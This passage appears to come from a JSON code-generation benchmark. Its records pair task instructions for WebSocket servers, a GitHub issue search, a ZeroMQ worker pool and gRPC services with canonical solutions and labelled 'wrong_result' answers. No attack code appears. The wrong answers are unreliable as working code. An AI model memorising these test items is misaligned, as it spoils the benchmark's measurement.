    "Canonical_solution": "import asyncio\nimport threading\nimport letta.server.ws_api.protocol as protocol\n\nclass SyncWebSocketInterface:\n    def __init__(self):\n        self.clients = set()\n        self.loop = asyncio.new_event_loop()\n        self.thread = threading.Thread(target=self._run_event_loop, daemon=True)\n        self.thread.start()\n\n    def _run_event_loop(self):\n        asyncio.set_event_loop(self.loop)\n        try:\n            self.loop.run_forever()\n        finally:\n            self.loop.run_until_complete(self.loop.shutdown_asyncgens())\n            self.loop.close()\n\n    def _run_async(self, coroutine):\n        if not self.loop.is_closed():\n            asyncio.run_coroutine_threadsafe(coroutine, self.loop)\n\n    async def _send_to_all_clients(self, clients, msg):\n        if clients:\n            await asyncio.gather(*(client.send_text(msg) for client in clients))\n\n    def register_client(self, websocket):\n        self.clients.add(websocket)\n\n    def unregister_client(self, websocket):\n        self.clients.remove(websocket)\n\n    def internal_monologue(self, msg):\n        print(msg)\n        if self.clients:\n            self._run_async(self._send_to_all_clients(self.clients, protocol.server_agent_internal_monologue(msg)))\n\n    def assistant_message(self, msg):\n        print(msg)\n        if self.clients:\n            self._run_async(self._send_to_all_clients(self.clients, protocol.server_agent_assistant_message(msg)))\n\n    def function_message(self, msg):\n        print(msg)\n        if self.clients:\n            self._run_async(self._send_to_all_clients(self.clients, protocol.server_agent_function_message(msg)))\n\n    def close(self):\n        self.loop.call_soon_threadsafe(self.loop.stop)\n        self.thread.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 45,
    "wrong_result": "```python\nimport asyncio\nimport threading\nfrom typing import Set\n\nclass SyncWebSocketInterface:\n    def __init__(self):\n        self.clients: Set = set()\n        self.loop = asyncio.new_event_loop()\n        self.thread = threading.Thread(target=self._run_event_loop)\n        self.thread.start()\n\n    def _run_event_loop(self):\n        asyncio.set_event_loop(self.loop)\n        self.loop.run_forever()\n\n    def _run_async(self, coroutine):\n        asyncio.run_coroutine_threadsafe(coroutine, self.loop)\n\n    async def _send_to_all_clients(self, clients, msg):\n        for client in clients:\n            await client.send(msg)\n\n    def register_client(self, websocket):\n        self.clients.add(websocket)\n\n    def unregister_client(self, websocket):\n        self.clients.remove(websocket)\n\n    def internal_monologue(self, msg):\n        print(msg)\n        self._run_async(self._send_to_all_clients(self.clients, msg))\n\n    def assistant_message(self, msg):\n        print(msg)\n        self._run_async(self._send_to_all_clients(self.clients, msg))\n\n    def function_message(self, msg):\n        print(msg)\n        self._run_async(self._send_to_all_clients(self.clients, msg))\n\n    def close(self):\n        self.loop.call_soon_threadsafe(self.loop.stop)\n        self.thread.join()\n```\n"
  },
  {
    "Task_id": 467,
    "Instruction": "Task Description: Create a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients based on the requested function.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, performs specified operations (echo, ask, or throw), and returns appropriate responses. The start_websocket_server function initializes and starts the WebSocket server.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput:\n- None (The function runs indefinitely, maintaining the WebSocket connection and processing messages)\n\nNote: The server expects JSON messages with the following structure:\n{\n  \"function\": str (required, specifies operation: \"echo\", \"ask\", or \"throw\"),\n  \"args\": list (arguments for the specified function)\n}\n\nThe server returns JSON responses with either:\n- A \"return\" field containing the result for successful operations\n- A \"throw\" field containing error messages for failures",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "```python\nimport asyncio\nimport json\nimport websockets\n\nasync def server(websocket, path):\n    async for message in websocket:\n        data = json.loads(message)\n        function = data.get(\"function\")\n        args = data.get(\"args\", [])\n        if function == \"echo\":\n            response = {\"return\": args}\n        elif function == \"ask\":\n            response = {\"return\": \"Yes\"}\n        elif function == \"throw\":\n            response = {\"throw\": \"An error occurred\"}\n        else:\n            response = {\"throw\": \"Unknown function\"}\n        await websocket.send(json.dumps(response))\n\nasync def start_websocket_server():\n    async with websockets.serve(server, \"localhost\", 8765):\n        await asyncio.Future()  # run forever\n```"
  },
  {
    "Task_id": 469,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle bidirectional communication between clients and the server, with support for message production and consumption through multiprocessing queues.\n\nFunction Description: The SocketWorker function establishes a WebSocket server that manages client connections, processes incoming messages, and sends messages to specific clients based on their unique IDs. It uses asynchronous programming to handle multiple clients concurrently.\n\nInput:\n- queueX: multiprocessing.Queue - Queue for outgoing messages to clients (format: (client_id, message))\n- queueZ: multiprocessing.Queue - Queue for incoming messages from clients (format: (client_id, message))\n\nOutput: None (The function runs indefinitely as a server process)\n\nMethods (nested async functions within SocketWorker):\n\n1. producer() -> Union[Tuple[str, str], str] - Generates messages to be sent to clients, either from queueX or periodic ping messages.\n\n2. producer_handler(websocket: WebSocketServerProtocol, path: str) -> None - Handles sending messages to connected clients via the WebSocket connection.\n\n3. consumer(websocket: WebSocketServerProtocol, msg: str) -> None - Processes incoming messages from clients, handling pong responses and forwarding valid requests to queueZ.\n\n4. consumer_handler(websocket: WebSocketServerProtocol, path: str) -> None - Continuously receives messages from a client connection and processes them.\n\n5. server(websocket: WebSocketServerProtocol, path: str) -> None - Main connection handler that manages client lifecycle, assigning unique IDs and coordinating producer/consumer tasks.\n\n6. srv_exception(loop: asyncio.AbstractEventLoop, context: dict) -> None - Exception handler for the WebSocket server event loop.",
    "Canonical_solution": "import asyncio\nimport websockets\nimport signal\nimport json\nimport random\nimport time\nfrom multiprocessing import Queue\n\n_DEBUG_LEVEL_ = 2\nPORT_NUM = 8266\n\ndef SocketWorker(queueX, queueZ):\n    signal.signal(signal.SIGINT, signal.SIG_DFL)\n    USERS = set()\n\n    async def producer():\n        hasData = False\n        try:\n            K, out = queueX.get(timeout=0.05)\n            hasData = True\n        except:\n            pass\n        if hasData:\n            return (K, out)\n        else:\n            await asyncio.sleep(0.001)\n            if random.random() < -0.003:\n                return '[PING]'\n            else:\n                return ''\n\n    async def producer_handler(websocket, path):\n        while True:\n            msg = await producer()\n            if isinstance(msg, tuple):\n                K, msg = msg\n                for x in USERS:\n                    if x.client_id == K:\n                        await x.send(msg)\n                        break\n            elif msg != '':\n                await websocket.send(msg)\n\n    async def consumer(websocket, msg):\n        if msg == '[PONG]':\n            return\n        try:\n            msg = json.loads(msg)\n            if msg['op'].lower() == 'get':\n                queueZ.put((websocket.client_id, msg['txt']))\n        except Exception as e:\n            print(e)\n            pass\n\n    async def consumer_handler(websocket, path):\n        while True:\n            msg = await websocket.recv()\n            await consumer(websocket, msg)\n\n    async def server(websocket, path):\n        websocket.client_id = '%020x' % random.randrange(16**20)\n        USERS.add(websocket)\n        print(\"[ws connect]\", len(USERS), 'users @',\n              time.strftime(\"%Y %b %d %H:%M:%S\", time.localtime(time.time())))\n        try:\n            await websocket.send('id_' + websocket.client_id)\n            consumer_task = asyncio.ensure_future(\n                consumer_handler(websocket, path))\n            producer_task = asyncio.ensure_future(\n                producer_handler(websocket, path))\n            done, pending = await asyncio.wait(\n                [consumer_task, producer_task],\n                return_when=asyncio.FIRST_COMPLETED)\n            for task in pending:\n                task.cancel()\n        finally:\n            USERS.remove(websocket)\n            print(\"[ws disconnect]\", len(USERS))\n\n    def srv_exception(loop, context):\n        if _DEBUG_LEVEL_ > 1:\n            print('exception', loop, context)\n        pass\n\n    try:\n        start_server = websockets.serve(server, \"127.0.0.1\", PORT_NUM)\n        asyncio.get_event_loop().run_until_complete(start_server)\n        asyncio.get_event_loop().set_exception_handler(srv_exception)\n        asyncio.get_event_loop().run_forever()\n    except Exception as e:\n        print('[srv error]', e)",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "```python\nimport asyncio\nimport multiprocessing\nfrom typing import Union, Tuple\nimport websockets\n\nasync def producer(queueX: multiprocessing.Queue, queueZ: multiprocessing.Queue) -> Union[Tuple[str, str], str]:\n    while True:\n        if not queueX.empty():\n            yield queueX.get()\n        else:\n            yield \"ping\"\n\nasync def producer_handler(websocket: websockets.WebSocketServerProtocol, path: str):\n    async for message in producer(queueX, queueZ):\n        await websocket.send(message)\n\nasync def consumer(websocket: websockets.WebSocketServerProtocol, msg: str):\n    if msg == \"pong\":\n        return\n    if msg.startswith(\"request:\"):\n        queueZ.put((websocket.id, msg[8:]))\n\nasync def consumer_handler(websocket: websockets.WebSocketServerProtocol, path: str):\n    async for message in websocket:\n        await consumer(websocket, message)\n\nasync def server(websocket: websockets.WebSocketServerProtocol, path: str):\n    websocket.id = path\n    await asyncio.gather(producer_handler(websocket, path), consumer_handler(websocket, path))\n\ndef SocketWorker(queueX: multiprocessing.Queue, queueZ: multiprocessing.Queue):\n    async def srv_exception(loop: asyncio.AbstractEventLoop, context: dict):\n        print(\"Caught exception: \", context['message'])\n        loop.stop()\n\n    loop = asyncio.get_event_loop()\n    loop.set_exception_handler(srv_exception)\n    start_server = websockets.serve(server, \"localhost\", 6789)\n    asyncio.ensure_future(start_server)\n    loop.run_forever()\n```\n"
  },
  {
    "Task_id": 48,
    "Instruction": "Task Description: Implement an asynchronous function to search GitHub issues using the GitHub API, handling authentication and response processing.\n\nFunction Description: The function `search_github_issues` asynchronously searches for GitHub issues based on a query string, with options to specify the repository, number of results, and an optional API token. It handles authentication, sends an HTTP GET request to the GitHub API, processes the response, and returns a formatted summary of the issues found.\n\nInput:\n- `query`: str - The search query string for GitHub issues.\n- `repo`: str (optional, default=\"prefecthq/prefect\") - The repository to search in, formatted as \"owner/repo\".\n- `n`: int (optional, default=3) - The maximum number of issues to return.\n- `api_token`: Optional[str] (optional, default=None) - The GitHub API token for authentication. If not provided, the function attempts to retrieve it from various sources.\n\nOutput:\n- str - A formatted string summarizing the found GitHub issues, including their titles, URLs, and truncated bodies. Returns \"No issues found.\" if no issues match the query.",
    "Canonical_solution": "import os\nimport httpx\nfrom typing import Optional\n\nasync def get_token() -> str:\n    try:\n        from prefect.blocks.system import Secret\n        return (await Secret.load(name=\"github-token\")).get()  # type: ignore\n    except (ImportError, ValueError) as exc:\n        getattr(get_logger(\"marvin\"), \"debug_kv\")(\n            (\n                \"Prefect Secret for GitHub token not retrieved. \"\n                f\"{exc.__class__.__name__}: {exc}\"\n                \"red\"\n            ),\n        )\n\n    try:\n        return getattr(marvin.settings, \"github_token\")\n    except AttributeError:\n        pass\n\n    if token := os.environ.get(\"MARVIN_GITHUB_TOKEN\", \"\"):\n        return token\n\n    raise RuntimeError(\"GitHub token not found\")\n\nasync def search_github_issues(\n    query: str,\n    repo: str = \"prefecthq/prefect\",\n    n: int = 3,\n    api_token: Optional[str] = None,\n) -> str:\n    headers = {\"Accept\": \"application/vnd.github.v3+json\"}\n    headers[\"Authorization\"] = f\"Bearer {api_token or await get_token()}\"\n\n    async with httpx.AsyncClient() as client:\n        response = await client.get(\n            \"https://api.github.com/search/issues\",\n            headers=headers,\n            params={\n                \"q\": query if \"repo:\" in query else f\"repo:{repo} {query}\",\n                \"order\": \"desc\",\n                \"per_page\": n,\n            },\n        )\n        response.raise_for_status()\n\n    issues_data = response.json()[\"items\"]\n\n    for issue in issues_data:\n        if not issue[\"body\"]:\n            continue\n        issue[\"body\"] = slice_tokens(issue[\"body\"], 1000)\n\n    issues = [GitHubIssue(**issue) for issue in issues_data]\n\n    summary = \"\\n\\n\".join(\n        f\"{issue.title} ({issue.html_url}):\\n{issue.body}\" for issue in issues\n    )\n    if not summary.strip():\n        return \"No issues found.\"\n    return summary",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "```python\nimport os\nimport aiohttp\nimport asyncio\n\nasync def search_github_issues(query: str, repo: str = \"prefecthq/prefect\", n: int = 3, api_token: str = None) -> str:\n    if not api_token:\n        api_token = os.getenv(\"GITHUB_API_TOKEN\")\n    headers = {\"Authorization\": f\"token {api_token}\"} if api_token else {}\n    url = f\"https://api.github.com/search/issues?q={query}+repo:{repo}&sort=updated&order=desc\"\n    async with aiohttp.ClientSession(headers=headers) as session:\n        async with session.get(url) as response:\n            data = await response.json()\n            if data[\"total_count\"] == 0:\n                return \"No issues found.\"\n            issues = data[\"items\"][:n]\n            summary = \"\\n\".join([f\"Title: {issue['title']}\\nURL: {issue['html_url']}\\nBody: {issue['body'][:100]}...\" for issue in issues])\n            return summary\n```"
  },
  {
    "Task_id": 481,
    "Instruction": "Task Description: Implement a multi-process data processing system using ZeroMQ for inter-process communication, where worker processes apply a mapping function to incoming data points and return the results.\n\nClass Description: MultiProcessMapDataZMQ is a class that manages multiple worker processes for parallel data processing using ZeroMQ's REQ/REP pattern. It handles process creation, communication, and data serialization.\n\nAttributes:\n- ds: [Any] - The data source to be processed\n- num_proc: [int] - Number of worker processes to create\n- map_func: [callable] - Function to apply to each data point\n- _buffer_size: [int] - High water mark for ZeroMQ sockets\n- _strict: [bool] - Whether to enforce strict processing rules\n- _procs: [list] - List of worker processes\n- context: [zmq.Context] - ZeroMQ context\n- socket: [zmq.Socket] - Main DEALER socket for communication\n- _proc_ids: [list] - List of process identifiers\n\nMethods:\n- __init__(ds, num_proc=None, map_func=None, *, buffer_size=200, strict=False) -> None - Initializes the multi-process mapper with configuration parameters\n- reset_state() -> None - Sets up ZeroMQ context, sockets, and starts worker processes\n- _create_worker(id, pipename, hwm) -> _Worker - Creates a worker process instance\n- _send(dp) -> None - Sends a data point to workers\n- _recv() -> Any - Receives processed data from workers\n\nNested _Worker Class:\n- __init__(identity, map_func, pipename, hwm) -> None - Initializes a worker process\n- run() -> None - Worker's main loop that processes incoming data using REQ/REP pattern",
    "Canonical_solution": "import zmq\nimport multiprocessing as mp\nfrom ..utils.serialize import dumps_once as dumps, loads_once as loads\nfrom ..utils.concurrency import enable_death_signal\n\nclass MultiProcessMapDataZMQ:\n    class _Worker(mp.Process):\n        def __init__(self, identity, map_func, pipename, hwm):\n            super(MultiProcessMapDataZMQ._Worker, self).__init__()\n            self.identity = identity\n            self.map_func = map_func\n            self.pipename = pipename\n            self.hwm = hwm\n\n        def run(self):\n            enable_death_signal(_warn=self.identity == b'0')\n            ctx = zmq.Context()\n            socket = ctx.socket(zmq.REP)\n            socket.setsockopt(zmq.IDENTITY, self.identity)\n            socket.set_hwm(self.hwm)\n            socket.connect(self.pipename)\n\n            while True:\n                dp = loads(socket.recv(copy=False))\n                dp = self.map_func(dp)\n                socket.send(dumps(dp), copy=False)\n\n    def __init__(self, ds, num_proc=None, map_func=None, *, buffer_size=200, strict=False):\n        self.ds = ds\n        self.num_proc = num_proc\n        self.map_func = map_func\n        self._buffer_size = buffer_size\n        self._strict = strict\n        self._procs = []\n\n    def reset_state(self):\n        self.context = zmq.Context()\n        self.socket = self.context.socket(zmq.DEALER)\n        self.socket.set_hwm(self._buffer_size * 2)\n        pipename = _get_pipe_name('dataflow-map')\n        _bind_guard(self.socket, pipename)\n\n        self._proc_ids = [u'{}'.format(k).encode('utf-8') for k in range(self.num_proc)]\n        worker_hwm = int(self._buffer_size * 2 // self.num_proc)\n        self._procs = [self._create_worker(self._proc_ids[k], pipename, worker_hwm)\n                       for k in range(self.num_proc)]\n\n        self._start_processes()\n\n    def _create_worker(self, id, pipename, hwm):\n        return MultiProcessMapDataZMQ._Worker(id, self.map_func, pipename, hwm)\n\n    def _send(self, dp):\n        msg = [b\"\", dumps(dp)]\n        self.socket.send_multipart(msg, copy=False)\n\n    def _recv(self):\n        msg = self.socket.recv_multipart(copy=False)\n        dp = loads(msg[1])\n        return dp",
    "Code_level": "Class-level",
    "FSMID_for_test": 87,
    "wrong_result": "```python\nimport zmq\nimport multiprocessing\nimport pickle\nimport time\nimport os\n\nclass MultiProcessMapDataZMQ:\n    def __init__(self, ds, num_proc=None, map_func=None, *, buffer_size=200, strict=False):\n        self.ds = ds\n        self.num_proc = num_proc or multiprocessing.cpu_count()\n        self.map_func = map_func\n        self._buffer_size = buffer_size\n        self._strict = strict\n        self._procs = []\n        self.context = None\n        self.socket = None\n        self._proc_ids = []\n\n    def reset_state(self):\n        self.context = zmq.Context()\n        self.socket = self.context.socket(zmq.DEALER)\n        self.socket.set_hwm(self._buffer_size)\n        self.socket.setsockopt(zmq.IDENTITY, os.urandom(1))\n        self.socket.bind(\"inproc://main\")\n        for i in range(self.num_proc):\n            proc = self._create_worker(i, \"inproc://worker{}\".format(i), self._buffer_size)\n            self._procs.append(proc)\n            self._proc_ids.append(i)\n            proc.start()\n\n    def _create_worker(self, id, pipename, hwm):\n        return _Worker(id, self.map_func, pipename, hwm)\n\n    def _send(self, dp):\n        self.socket.send(pickle.dumps(dp))\n\n    def _recv(self):\n        return pickle.loads(self.socket.recv())\n\n    def __enter__(self):\n        self.reset_state()\n        return self\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        for proc in self._procs:\n            proc.terminate()\n        self.context.term()\n\nclass _Worker(multiprocessing.Process):\n    def __init__(self, identity, map_func, pipename, hwm):\n        super().__init__()\n        self.identity = identity\n        self.map_func = map_func\n        self.pipename = pipename\n        self.hwm = hwm\n\n    def run(self):\n        context = zmq.Context()\n        socket = context.socket(zmq.REP)\n        socket.set_hwm(self.hwm)\n        socket.setsockopt(zmq.IDENTITY, self.identity)\n        socket.connect(self.pipename)\n        while True:\n            dp = socket.recv()\n            socket.send(self.map_func(pickle.loads(dp)))\n```\n"
  },
  {
    "Task_id": 485,
    "Instruction": "Task Description: Implement a gRPC server in Python that provides speech recognition and language processing services using gRPC for inter-process communication.\n\nClass Description: The implementation consists of two main classes: ApiService (which handles the actual service logic) and GrpcServer (which manages the server lifecycle).\n\nAttributes:\n\nApiService:\n- speech_model: [Any] - The model used for speech recognition\n- language_model: [Any] - The model used for language processing\n\nGrpcServer:\n- host: [str] - The host address to bind the server to\n- port: [str] - The port number to bind the server to\n- max_workers: [int] - Maximum number of worker threads in the thread pool\n- server: [grpc.Server] - The gRPC server instance\n\nMethods:\n\nApiService:\n- Speech(request: [SpeechRequest], context: [grpc.ServicerContext]) -> [SpeechResponse] - Processes speech recognition requests\n- Language(request: [LanguageRequest], context: [grpc.ServicerContext]) -> [TextResponse] - Processes language translation requests\n- All(request: [SpeechRequest], context: [grpc.ServicerContext]) -> [TextResponse] - Processes combined speech recognition and language translation\n- Stream(request_iterator: [Iterator[SpeechRequest]], context: [grpc.ServicerContext]) -> [Iterator[TextResponse]] - Handles streaming speech recognition and processing\n\nGrpcServer:\n- start(service: [ApiService]) -> [None] - Starts the gRPC server with the specified service and runs it indefinitely\n  - Input: service - An instance of ApiService to handle incoming requests\n  - Output: None (runs indefinitely until interrupted)",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nfrom assets.asrt_pb2_grpc import AsrtGrpcServiceServicer, add_AsrtGrpcServiceServicer_to_server\nfrom assets.asrt_pb2 import SpeechResponse, TextResponse\nimport time\n\n_ONE_DAY_IN_SECONDS = 60 * 60 * 24\n\nclass ApiService(AsrtGrpcServiceServicer):\n    def __init__(self, speech_model, language_model):\n        self.speech_model = speech_model\n        self.language_model = language_model\n\n    def Speech(self, request, context):\n        wav_data = request.wav_data\n        wav_samples = decode_wav_bytes(samples_data=wav_data.samples,\n                                     channels=wav_data.channels, byte_width=wav_data.byte_width)\n        result = self.speech_model.recognize_speech(wav_samples, wav_data.sample_rate)\n        return SpeechResponse(status_code=200000, status_message='',\n                            result_data=result)\n\n    def Language(self, request, context):\n        result = self.language_model.pinyin_to_text(list(request.pinyins))\n        return TextResponse(status_code=200000, status_message='',\n                          text_result=result)\n\n    def All(self, request, context):\n        wav_data = request.wav_data\n        wav_samples = decode_wav_bytes(samples_data=wav_data.samples,\n                                     channels=wav_data.channels, byte_width=wav_data.byte_width)\n        result_speech = self.speech_model.recognize_speech(wav_samples, wav_data.sample_rate)\n        result = self.language_model.pinyin_to_text(result_speech)\n        return TextResponse(status_code=200000, status_message='',\n                          text_result=result)\n\n    def Stream(self, request_iterator, context):\n        result = list()\n        tmp_result_last = list()\n        beam_size = 100\n\n        for request in request_iterator:\n            wav_data = request.wav_data\n            wav_samples = decode_wav_bytes(samples_data=wav_data.samples,\n                                         channels=wav_data.channels,\n                                         byte_width=wav_data.byte_width)\n            result_speech = self.speech_model.recognize_speech(wav_samples, wav_data.sample_rate)\n\n            for item_pinyin in result_speech:\n                tmp_result = self.language_model.pinyin_stream_decode(tmp_result_last, item_pinyin, beam_size)\n                if len(tmp_result) == 0 and len(tmp_result_last) > 0:\n                    result.append(tmp_result_last[0][0])\n                    yield TextResponse(status_code=200000, status_message='',\n                                   text_result=''.join(result))\n                    result = list()\n                    tmp_result = self.language_model.pinyin_stream_decode([], item_pinyin, beam_size)\n                tmp_result_last = tmp_result\n                yield TextResponse(status_code=206000, status_message='',\n                               text_result=''.join(tmp_result[0][0]))\n\n        if len(tmp_result_last) > 0:\n            result.append(tmp_result_last[0][0])\n            yield TextResponse(status_code=200000, status_message='',\n                           text_result=''.join(result))\n\nclass GrpcServer:\n    def __init__(self, host, port, max_workers=10):\n        self.host = host\n        self.port = port\n        self.max_workers = max_workers\n        self.server = grpc.server(futures.ThreadPoolExecutor(max_workers=self.max_workers))\n\n    def start(self, service):\n        add_AsrtGrpcServiceServicer_to_server(service, self.server)\n        self.server.add_insecure_port(''.join([self.host, ':', self.port]))\n        self.server.start()\n        try:\n            while True:\n                time.sleep(_ONE_DAY_IN_SECONDS)\n        except KeyboardInterrupt:\n            self.server.stop(0)",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "wrong_result": "```python\nimport grpc\nfrom concurrent import futures\nfrom api_service import ApiService\nfrom grpc_server import GrpcServer\n\ndef main():\n    service = ApiService()\n    server = GrpcServer('localhost', '50051', 10)\n    server.start(service)\n\nif __name__ == '__main__':\n    main()\n```"
  },
  {
    "Task_id": 495,
    "Instruction": "Task Description: Create a function to set up and tear down a gRPC server with configurable interceptors and thread pool workers.\n\nFunction Description: The function `_set_up` initializes and starts a gRPC server with optional interceptors, while `_tear_down` gracefully stops the server. The server is configured to handle gRPC requests concurrently using a thread pool.\n\nInput:\n- `interceptors` (Optional[List[grpc.ServerInterceptor]]): A list of gRPC server interceptors for request/response processing. Defaults to None.\n- `server` (grpc.Server): The gRPC server instance to be stopped (for `_tear_down`).\n\nOutput:\n- `_set_up` returns the initialized and started `grpc.Server` instance.\n- `_tear_down` has no return value (stops the server).",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nfrom typing import List, Optional\n\ndef _set_up(interceptors: Optional[List[grpc.ServerInterceptor]] = None):\n    server = grpc.server(\n        futures.ThreadPoolExecutor(max_workers=2),\n        interceptors=interceptors,\n    )\n    add_gRPCTestServiceServicer_to_server(TestService(), server)\n    server.add_insecure_port(\"[::]:{}\".format(PORT))\n    server.start()\n    return server\n\ndef _tear_down(server: grpc.Server):\n    server.stop(None)",
    "Code_level": "Function-level",
    "FSMID_for_test": 74,
    "wrong_result": "```python\nimport grpc\nfrom concurrent import futures\n\ndef _set_up(interceptors=None):\n    server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))\n    if interceptors:\n        server.intercept(interceptors)\n    return server\n\ndef _tear_down(server):\n    server.stop(0)\n```"
  },
  {
    "Task_id": 498,
    "Instruction": "Task Description: Implement a gRPC server for Optuna storage proxy service that handles study and trial management operations.\n\nClass Description: OptunaStorageProxyService is a gRPC servicer class that implements the StorageService interface, providing methods to manage Optuna studies and trials through a gRPC server. It acts as a proxy between gRPC clients and the underlying Optuna storage backend.\n\nAttributes:\n- _backend: BaseStorage - The underlying Optuna storage implementation\n- _lock: threading.Lock - A lock for thread-safe operations\n\nMethods:\n- CreateNewStudy(request: api_pb2.CreateNewStudyRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewStudyReply - Creates a new study with given directions and name\n- DeleteStudy(request: api_pb2.DeleteStudyRequest, context: grpc.ServicerContext) -> api_pb2.DeleteStudyReply - Deletes a study with the given ID\n- SetStudyUserAttribute(request: api_pb2.SetStudyUserAttributeRequest, context: grpc.ServicerContext) -> api_pb2.SetStudyUserAttributeReply - Sets a user attribute for a study\n- GetStudyIdFromName(request: api_pb2.GetStudyIdFromNameRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyIdFromNameReply - Gets study ID from study name\n- GetStudyNameFromId(request: api_pb2.GetStudyNameFromIdRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyNameFromIdReply - Gets study name from study ID\n- GetAllStudies(request: api_pb2.GetAllStudiesRequest, context: grpc.ServicerContext) -> api_pb2.GetAllStudiesReply - Gets all studies in the storage\n- CreateNewTrial(request: api_pb2.CreateNewTrialRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewTrialReply - Creates a new trial in a study\n- SetTrialParameter(request: api_pb2.SetTrialParameterRequest, context: grpc.ServicerContext) -> api_pb2.SetTrialParameterReply - Sets parameters for a trial\n- GetTrial(request: api_pb2.GetTrialRequest, context: grpc.ServicerContext) -> api_pb2.GetTrialReply - Gets trial details\n- GetAllTrials(request: api_pb2.GetAllTrialsRequest, context: grpc.ServicerContext) -> api_pb2.GetAllTrialsReply - Gets all trials for a study with optional state filtering",
    "Canonical_solution": "from concurrent.futures import ThreadPoolExecutor\nimport grpc\nfrom optuna.storages._grpc.grpc_imports import api_pb2_grpc\nfrom optuna.storages._grpc.grpc_imports import api_pb2\nfrom optuna.storages._grpc.grpc_imports import StorageServiceServicer\nfrom optuna.storages import BaseStorage\nfrom optuna._experimental import experimental_func\nimport logging\n\n_logger = logging.get_logger(__name__)\n\nclass OptunaStorageProxyService(StorageServiceServicer):\n    def __init__(self, storage: BaseStorage) -> None:\n        self._backend = storage\n        self._lock = threading.Lock()\n\n    def CreateNewStudy(self, request: api_pb2.CreateNewStudyRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewStudyReply:\n        directions = [\n            StudyDirection.MINIMIZE if d == api_pb2.MINIMIZE else StudyDirection.MAXIMIZE\n            for d in request.directions\n        ]\n        study_name = request.study_name\n\n        try:\n            study_id = self._backend.create_new_study(directions=directions, study_name=study_name)\n        except DuplicatedStudyError as e:\n            context.abort(code=grpc.StatusCode.ALREADY_EXISTS, details=str(e))\n        return api_pb2.CreateNewStudyReply(study_id=study_id)\n\n    def DeleteStudy(self, request: api_pb2.DeleteStudyRequest, context: grpc.ServicerContext) -> api_pb2.DeleteStudyReply:\n        study_id = request.study_id\n        try:\n            self._backend.delete_study(study_id)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.DeleteStudyReply()\n\n    def SetStudyUserAttribute(self, request: api_pb2.SetStudyUserAttributeRequest, context: grpc.ServicerContext) -> api_pb2.SetStudyUserAttributeReply:\n        try:\n            self._backend.set_study_user_attr(\n                request.study_id, request.key, json.loads(request.value)\n            )\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.SetStudyUserAttributeReply()\n\n    def GetStudyIdFromName(self, request: api_pb2.GetStudyIdFromNameRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyIdFromNameReply:\n        try:\n            study_id = self._backend.get_study_id_from_name(request.study_name)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.GetStudyIdFromNameReply(study_id=study_id)\n\n    def GetStudyNameFromId(self, request: api_pb2.GetStudyNameFromIdRequest, context: grpc.ServicerContext) -> api_pb2.GetStudyNameFromIdReply:\n        study_id = request.study_id\n        try:\n            name = self._backend.get_study_name_from_id(study_id)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        assert name is not None\n        return api_pb2.GetStudyNameFromIdReply(study_name=name)\n\n    def GetAllStudies(self, request: api_pb2.GetAllStudiesRequest, context: grpc.ServicerContext) -> api_pb2.GetAllStudiesReply:\n        studies = self._backend.get_all_studies()\n        return api_pb2.GetAllStudiesReply(\n            studies=[\n                api_pb2.Study(\n                    study_id=study._study_id,\n                    study_name=study.study_name,\n                    directions=[\n                        api_pb2.MINIMIZE if d == StudyDirection.MINIMIZE else api_pb2.MAXIMIZE\n                        for d in study.directions\n                    ],\n                    user_attributes={\n                        key: json.dumps(value) for key, value in study.user_attrs.items()\n                    },\n                    system_attributes={\n                        key: json.dumps(value) for key, value in study.system_attrs.items()\n                    },\n                )\n                for study in studies\n            ]\n        )\n\n    def CreateNewTrial(self, request: api_pb2.CreateNewTrialRequest, context: grpc.ServicerContext) -> api_pb2.CreateNewTrialReply:\n        study_id = request.study_id\n        template_trial = None\n        if not request.template_trial_is_none:\n            template_trial = _from_proto_trial(request.template_trial)\n\n        try:\n            trial_id = self._backend.create_new_trial(study_id, template_trial)\n        except KeyError as e:\n            context.abort(code=grpc.StatusCode.NOT_FOUND, details=str(e))\n        return api_pb2.CreateNewTrialReply(trial_id=trial_id)\n\n    def SetTrialParameter(self, request: api_pb2.SetTrialParameterRequest, context: 